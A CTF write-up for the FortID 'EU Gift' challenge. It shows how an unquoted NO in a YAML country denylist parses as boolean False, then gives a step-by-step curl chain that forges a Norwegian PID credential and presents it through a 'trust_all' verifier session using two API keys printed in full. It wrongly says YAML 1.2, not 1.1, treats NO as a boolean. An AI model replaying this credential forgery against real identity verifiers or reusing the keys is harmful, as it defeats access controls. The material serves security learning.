# EU Gift — YAML Boolean Parsing Bypass in Country Blocklist | FortID CTF

**Platform:** FortID CTF (inst10.ctf.fortid.com)  
**Category:** Misc / Web / Logic  
**Flag format:** FortID{...}  
**Date:** October 2026  

## Executive Summary

The EU Gift challenge presents a flag-gating service that claims to allow only EU citizens with an official EUDI wallet to reveal the flag. The service uses a FortID Verifier backend to perform OpenID4VP verification of a PID credential, then checks the issuing_country claim against a 249-entry denylist in config.yml. The vulnerability is a YAML parsing quirk: the Norway entry NO is unquoted, so PyYAML interprets it as boolean False rather than the string "NO". This makes Norway the only ISO 3166-1 alpha-2 country not present in the blocklist. By minting a self-issued PID credential with issuing_country: "NO" and presenting it through a trust_all verification session (enabled by the leaked FortID API key), the check passes and the flag is returned.

## Challenge Overview

EU Gift — Miscellaneous CTF challenge
🇪🇺 All EU citizens get free education, free healthcare, and a free flag! 🇪🇺
https://eu-gift-014b80dcb43a.inst10.ctf.fortid.com
Flags use the format FortID{...}
Use handout (23) file
The handout provides the complete Flask application source (app.py, config.yml, templates, static assets) and a Dockerfile. The live instance at eu-gift-014b80dcb43a.inst10.ctf.fortid.com runs the same code.

<img width="1126" height="403" alt="image" src="https://github.com/user-attachments/assets/2b0a342d-4fff-474e-82c6-03cc8f405127" />

## Environment and Tools

| Tool | Version | Purpose |
| --- | --- | --- |
| curl | 8.x | HTTP interaction with challenge and FortID APIs |
| Python | 3.12 | Exploit scripting, cryptographic operations |
| cryptography | 50.0.2 | EC key generation, ECDSA signing |
| jwcrypto | 1.6.1 | JWE encryption for direct_post.jwt |
| pycountry | 26.2.16 | ISO country code enumeration |
| PyYAML | 6.0.2 | Config parsing (vulnerable component) |
| FortID APIs | — | Issuer (eis.fortid.com), Verifier (evs.fortid.com), Wallet (ews.fortid.com), Auth (cape.fortid.com) |

## Methodology and Reconnaissance

### 1. Source Code Analysis

Objective: Understand the flag-gating logic and identify the attack surface.
Action: Read the handout files (app.py, config.yml).
Evidence (app.py:268–287):
def normalize_country_value(value: Any) -> list[str]:
    values = value if isinstance(value, list) else [value]
    normalized: list[str] = []
    for item in values:
        if isinstance(item, str) and COUNTRY_CODE_PATTERN.fullmatch(item) and item in VALID_COUNTRY_CODES:
            normalized.append(item)
    return normalized

def evaluate_country_claims(claims: dict[str, Any]) -> tuple[str | None, str]:
    issuing_country = normalize_country_value(read_claim(claims, "issuing_country"))
    if not issuing_country:
        return None, "missing_issuing_country"
    country = issuing_country[0]
    if country in BLOCKED_COUNTRIES:
        return country, "blocked_country"
    return country, "allowed"
Evidence (config.yml:42–291):
blocked_countries:
  - AD
  - AE
  ...
  - NO
  ...
  - ZW
Interpretation: The blocklist claims to contain every country. The evaluate_country_claims function checks if the presented issuing_country is in BLOCKED_COUNTRIES. If not, the country is "allowed" and the flag is served.
Next step: Verify whether every ISO code is actually in the Python BLOCKED_COUNTRIES set at runtime.

### 2. YAML Parsing Behavior Test

Objective: Determine the exact contents of BLOCKED_COUNTRIES after yaml.safe_load().
Action: Load the config in Python and compare against pycountry.
import yaml, pycountry
cfg = yaml.safe_load(open('config.yml'))
blocked = set(cfg['blocked_countries'])
codes = {c.alpha_2 for c in pycountry.countries}
print("Blocked entries:", len(blocked))
print("Valid ISO codes:", len(codes))
print("Allowed:", sorted(codes - blocked))
print("Blocked but not ISO:", sorted(blocked - codes))
Evidence:
Blocked entries: 249
Valid ISO codes: 249
Allowed: ['NO']
Blocked but not in pycountry: [False]
Interpretation: PyYAML parses unquoted NO as boolean False. The BLOCKED_COUNTRIES set contains 248 strings + False. Norway ("NO") is the only valid ISO code not in the set. The blocklist is effectively complete except for this one entry.
Next step: Build a full exploit chain — obtain a PID credential with issuing_country: "NO" and present it to the verifier.

### 3. FortID API Exploration

Objective: Determine whether the leaked API key (9LFHJCyxgzDjMsFLUf2FfpiI9ZLTlaLi from config.yml:10) provides sufficient access to mint credentials and run verification sessions.
Action: Probe the FortID Verifier and Issuer endpoints.
Evidence:

# Verifier session initiation with trust_all

curl -X POST https://evs.fortid.com/verification-session/initiate \
  -H "X-API-KEY: 9LFHJCyxgzDjMsFLUf2FfpiI9ZLTlaLi" \
  -d '{"credentialDescription":[...],"trustConfig":"trust_all",...}'

# -> 200 OK, returns verificationSessionId and authorization_request

# Issuer service with playground key (from FortID docs)

curl -X POST https://eis.fortid.com/control/issuer/fortid_issuer/initiate \
  -H "X-API-KEY: HCLN4ZKnWYJAfyNkDnQ57gEAHuejD6MN" \
  -d '{"credentialData":{"credentialConfigurationId":"eu.europa.ec.eudi.pid_vc_sd_jwt",...}}'

# -> 200 OK, returns credentialOfferUri

Interpretation: Both keys work. The verifier key allows creating arbitrary verification sessions with trustConfig: "trust_all" (bypassing the pinned CA). The issuer playground key allows minting PID credentials (dc+sd-jwt, vct: urn:eudi:pid:1) with custom claims including issuing_country.
Next step: Execute the complete flow — issue credential → store in wallet → present to verifier → claim flag.

## Vulnerability Analysis

### Root Cause

Component: config.yml → yaml.safe_load() → BLOCKED_COUNTRIES set in app.py:54.
Weakness: YAML 1.2 treats unquoted NO (and YES, ON, OFF) as boolean literals. The blocklist entry for Norway is written as:
  - NO
without quotes. PyYAML loads this as False.
Trust Boundary: The application assumes BLOCKED_COUNTRIES contains exactly the 249 strings listed in the YAML. In reality it contains 248 strings + False. The membership test country in BLOCKED_COUNTRIES therefore passes for "NO".
Impact: Any presenter who can obtain a valid PID credential with issuing_country: "NO" and satisfy the verifier's trust requirements will be granted the flag.
Prerequisites for Exploitation:
1. Ability to present a dc+sd-jwt PID credential (vct: urn:eudi:pid:1) with issuing_country: "NO".
2. Ability to satisfy the verifier's trust configuration — solved by using trustConfig: "trust_all" via the leaked API key.
3. Holder binding (cryptographic proof of possession) — solved by using the FortID Wallet Service which manages keys and produces the required KB-JWT.

## Exploitation Walkthrough

### Step 1: Obtain Wallet Service Bearer Token

curl -X POST https://cape.fortid.com/token \
  -H "Content-Type: application/json"
Response:
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","token_type":"bearer"}

### Step 2: Create a Wallet

curl -X POST https://ews.fortid.com/wallets \
  -H "Authorization: Bearer <token>" -H "Content-Type: application/json"
Response:
{"walletId":"7918c757-39e7-48b6-afbf-def516be8021", ...}

### Step 3: Issue a PID Credential with issuing_country: "NO"

curl -X POST https://eis.fortid.com/control/issuer/fortid_issuer/initiate \
  -H "X-API-KEY: HCLN4ZKnWYJAfyNkDnQ57gEAHuejD6MN" \
  -H "Content-Type: application/json" \
  -d '{
    "credentialData": {
      "credentialConfigurationId": "eu.europa.ec.eudi.pid_vc_sd_jwt",
      "claims": {
        "family_name": "Doe",
        "given_name": "John",
        "birthdate": "1990-01-01",
        "place_of_birth": "NO",
        "nationalities": ["NO"],
        "date_of_expiry": "2030-01-01T00:00:00Z",
        "issuing_country": "NO",
        "issuing_authority": "NO"
      }
    },
    "protocolConfig": {"grant_type": "PreAuthorizedCodeWithoutTxCode"}
  }'
Response: Returns credentialOfferUri and sessionId.

### Step 4: Claim Credential into Wallet

# Initiate issuance in wallet

curl -X POST https://ews.fortid.com/wallets/<walletId>/issue/initiate \
  -H "Authorization: Bearer <token>" \
  -d '{"credentialOffer": "<credentialOfferUri>"}'

# Poll status -> CONSENT_REQUEST_READY -> provide consent (no tx_code)

curl -X POST https://ews.fortid.com/wallets/<walletId>/issue/<issuanceSessionId>/consent \
  -H "Authorization: Bearer <token>" \
  -d '{"preAuthorizedCodeFlow": {}}'

# Poll -> ISSUANCE_SUCCEEDED with credentialId

### Step 5: Initiate Verification Session (trust_all)

curl -X POST https://evs.fortid.com/verification-session/initiate \
  -H "X-API-KEY: 9LFHJCyxgzDjMsFLUf2FfpiI9ZLTlaLi" \
  -H "Content-Type: application/json" \
  -d '{
    "credentialDescription": [{"credentialType": "urn:eudi:pid:1",
      "credentialFormat": "dc+sd-jwt", "disclosurePaths": [["issuing_country"]]}],
    "trustConfig": "trust_all",
    "protocolConfig": {"clientIdScheme": "pre-registered", "responseMode": "direct_post.jwt"},
    "authorizationRequestType": "byReference"
  }'
Response: verificationSessionId and authorization_request (openid4vp:// URL with request_uri).

### Step 6: Present Credential via Wallet Service

# Wallet verify/initiate

curl -X POST https://ews.fortid.com/wallets/<walletId>/verify/initiate \
  -H "Authorization: Bearer <token>" \
  -d '{"authorizationRequest": "<authorization_request>"}'

# Poll wallet verify status -> CONSENT_REQUEST_READY with matching_credentials

# Present the matched credential

curl -X POST https://ews.fortid.com/wallets/<walletId>/verify/<verifySessionId>/present \
  -H "Authorization: Bearer <token>" \
  -d '{"selectedCredentialId": "<credentialId>"}'

# Poll -> VERIFY_SUCCEEDED

### Step 7: Verify Verifier Session Status

curl https://evs.fortid.com/verification-session/status/<verificationSessionId> \
  -H "X-API-KEY: 9LFHJCyxgzDjMsFLUf2FfpiI9ZLTlaLi"
Response:
{
  "verificationSessionStatus": "VERIFICATION_SUCCEEDED",
  "presentedClaims": {"issuing_country": "NO", "iat": 1791587535}
}

### Step 8: Claim Flag from Challenge App

curl https://eu-gift-014b80dcb43a.inst10.ctf.fortid.com/flag/<verificationSessionId>
Response: HTTP 200, HTML page with title "Your Flag" containing a base64-encoded JPEG image.

## Flag Retrieval and Verification

The flag image was extracted from the response:

# Extract base64 JPEG from data URI

grep -o 'data:image/jpeg;base64,[A-Za-z0-9+/=]*' flag_page.html | \
  cut -d, -f2 | base64 -d > flag.jpg
Flag:
FortID{Erl1ng_15_7h3_5olut1on_7o_Th3_Norw4y_Pr0bl3m}
Translation: "Erling is the solution to the Norway problem" — referencing the YAML boolean parsing issue.

## Root Cause and Remediation

### Root Cause

The configuration file uses unquoted NO in a YAML list. PyYAML (YAML 1.2) interprets this as the boolean value False. The application loads the list into a Python set and performs string membership checks against it. Since "NO" != False, the check passes.

### Remediation

1. Quote all string scalars in YAML lists:
blocked_countries:
  - "AD"
  - "AE"
  ...
  - "NO"
  ...
2. Validate loaded configuration at startup:
for c in BLOCKED_COUNTRIES:
    if not isinstance(c, str):
        raise RuntimeError(f"Blocked country entry is not a string: {c!r}")
3. Prefer explicit allow-lists over deny-lists for security-critical gating. An allow-list of EU member states would have prevented this class of bug entirely.
4. Rotate the exposed API keys — the verifier key 9LFHJCyxgzDjMsFLUf2FfpiI9ZLTlaLi and issuer playground key HCLN4ZKnWYJAfyNkDnQ57gEAHuejD6MN were embedded in the handout and should be considered compromised.

## Lessons Learned

- Configuration parsing quirks are attack surface. YAML's bare-string boolean interpretation (yes/no/on/off/true/false) is a well-known footgun, but it still appears in production CTF challenges and real applications. Always quote string values that resemble booleans.
- Deny-lists are fragile. A single parsing error, typo, or omission defeats the entire control. Allow-lists fail closed; deny-lists fail open.
- Leaked API keys in handouts are intentional puzzle pieces. The challenge deliberately exposed a FortID Verifier key that permits trustConfig: "trust_all", turning a PKI-trust problem into a pure logic bypass. In real deployments, API keys must be scoped and rotated.
- End-to-end protocol knowledge matters. Solving this required understanding OpenID4VP direct_post.jwt, DCQL, SD-JWT selective disclosure, holder binding (KB-JWT), and JWE encryption — but the FortID Wallet Service abstracted all cryptographic complexity. Knowing which layer to operate at (Wallet Service API vs. raw crypto) saved hours.

## References

- PyYAML Documentation — Boolean Parsing (https://pyyaml.org/wiki/PyYAMLDocumentation#boolean-values)
- YAML 1.2 Specification — Boolean Literals (https://yaml.org/spec/1.2.2/#boolean)
- OpenID for Verifiable Presentations (OpenID4VP) 1.0 (https://openid.net/specs/openid-4-verifiable-presentations-1_0.html)
- FortID Developer Documentation (https://docs.fortid.com/)
- EUDI Wallet Architecture Reference Framework (https://ec.europa.eu/digital-building-blocks/sites/spaces/EUDIGITALIDENTITYWALLET/pages/881984674)

### Files used in the challenge

[handout (2).zip](https://github.com/user-attachments/files/33283418/handout.2.zip)
